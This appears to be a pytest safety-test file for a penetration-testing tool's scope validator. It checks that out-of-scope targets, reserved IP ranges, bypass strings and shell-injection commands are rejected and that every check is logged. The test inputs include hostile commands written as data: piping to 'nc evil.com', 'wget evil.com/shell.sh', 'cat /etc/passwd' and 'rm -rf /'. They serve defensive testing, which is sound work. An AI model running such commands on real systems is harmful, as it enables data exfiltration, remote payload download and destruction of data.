# Safety Tests for Scope Validator - Story 1.8
# These tests MUST pass for scope validator to be production-ready

"""Safety tests for cyberred.tools.scope module.

These tests are marked with @pytest.mark.safety and verify that the
scope validator properly blocks unauthorized access attempts.

SAFETY-CRITICAL: These tests ensure the scope validator:
1. Cannot be bypassed
2. Always fails closed on errors
3. Blocks reserved IP ranges
4. Integrates correctly with tool execution
"""

import pytest

# These imports will fail initially (RED phase)
from cyberred.tools.scope import ScopeValidator
from cyberred.core.exceptions import ScopeViolationError


@pytest.mark.safety
class TestScopeSafetyBlocking:
    """Test that scope validator properly blocks out-of-scope actions."""

    @pytest.fixture
    def validator(self):
        """Create validator for safety tests."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": [80, 443],
            "allowed_protocols": ["tcp"],
            "allow_private": True,
        })

    def test_scope_violation_blocks_execution(self, validator):
        """Scope violation should completely block tool execution."""
        with pytest.raises(ScopeViolationError) as exc_info:
            validator.validate(target="10.0.0.1")
        # Check that the error indicates it's a scope-related violation
        error_str = str(exc_info.value).lower()
        assert "not in" in error_str or "scope" in error_str or "denied" in error_str

    def test_multiple_consecutive_violations_all_blocked(self, validator):
        """Multiple consecutive violations should all be blocked independently."""
        for target in ["10.0.0.1", "10.0.0.2", "10.0.0.3", "evil.com"]:
            with pytest.raises(ScopeViolationError):
                validator.validate(target=target)

    def test_scope_validator_cannot_be_bypassed(self, validator):
        """Scope validator should not have any bypass mechanism."""
        # Attempt various bypass techniques
        bypass_attempts = [
            {"target": "192.168.1.1/../../../etc/passwd"},  # Path traversal
            {"target": "192.168.1.1%00.evil.com"},  # Null byte injection
            {"target": "http://192.168.1.1@evil.com"},  # URL authority confusion
        ]
        for attempt in bypass_attempts:
            # These should either pass (if in-scope after normalization) or raise
            # but should NEVER allow access to evil.com
            try:
                result = validator.validate(**attempt)
                # If it passes, verify we're still in scope
                assert result is True
            except ScopeViolationError:
                pass  # Expected for bypass attempts

    def test_fail_closed_on_internal_error(self, validator):
        """Internal validator errors should fail closed (DENY)."""
        # Corrupt internal state
        original_networks = validator.config.allowed_networks
        validator.config.allowed_networks = "not_a_list"
        
        with pytest.raises(ScopeViolationError):
            validator.validate(target="192.168.1.1")
        
        # Restore for cleanup
        validator.config.allowed_networks = original_networks

    def test_reserved_ip_always_blocked_loopback(self):
        """Loopback addresses should ALWAYS be blocked."""
        # Even with the most permissive scope
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],  # All IPv4
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="127.0.0.1")
        with pytest.raises(ScopeViolationError):
            validator.validate(target="127.0.0.10")

    def test_reserved_ip_always_blocked_link_local(self):
        """Link-local addresses should ALWAYS be blocked."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="169.254.0.1")
        with pytest.raises(ScopeViolationError):
            validator.validate(target="169.254.255.254")

    def test_reserved_ip_always_blocked_multicast(self):
        """Multicast addresses should ALWAYS be blocked."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="224.0.0.1")
        with pytest.raises(ScopeViolationError):
            validator.validate(target="239.255.255.255")

    def test_reserved_ip_always_blocked_broadcast(self):
        """Broadcast address should ALWAYS be blocked."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="255.255.255.255")

    def test_private_ip_blocked_when_disallowed(self):
        """Private IPs should be blocked when allow_private=False."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],
            "allow_private": False,
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="10.0.0.1")
        with pytest.raises(ScopeViolationError):
            validator.validate(target="172.16.0.1")
        with pytest.raises(ScopeViolationError):
            validator.validate(target="192.168.1.1")


@pytest.mark.safety
class TestScopeCommandInjectionPrevention:
    """Test that command injection is properly blocked."""

    @pytest.fixture
    def validator(self):
        """Create validator for injection tests."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })

    def test_injection_semicolon_blocked(self, validator):
        """Semicolon command chaining should be blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1; cat /etc/passwd")

    def test_injection_pipe_blocked(self, validator):
        """Pipe command chaining should be blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1 | nc evil.com 1234")

    def test_injection_and_chain_blocked(self, validator):
        """&& command chaining should be blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1 && wget evil.com/shell.sh")

    def test_injection_or_chain_blocked(self, validator):
        """|| command chaining should be blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1 || rm -rf /")

    def test_injection_command_substitution_blocked(self, validator):
        """$() command substitution should be blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap $(cat /etc/hosts)")

    def test_injection_backtick_blocked(self, validator):
        """Backtick command execution should be blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap `id`")

    def test_injection_newline_blocked(self, validator):
        """Newline injection should be blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1\ncat /etc/passwd")


from unittest.mock import patch, MagicMock


@pytest.mark.safety
class TestScopeAuditCompliance:
    """Test that all scope checks are logged for audit compliance."""

    @pytest.fixture
    def validator(self):
        """Create validator for audit tests."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })

    def test_all_validations_logged(self, validator):
        """All validation attempts should be logged."""
        with patch("cyberred.tools.scope.log") as mock_log:
            # Successful validation
            validator.validate(target="192.168.1.1")
            # Verify logging was called
            assert mock_log.info.call_count >= 1

    def test_violations_logged(self, validator):
        """All scope violations should be logged."""
        with patch("cyberred.tools.scope.log") as mock_log:
            with pytest.raises(ScopeViolationError):
                validator.validate(target="10.0.0.1")
            # Violation should be logged
            assert mock_log.info.call_count >= 1
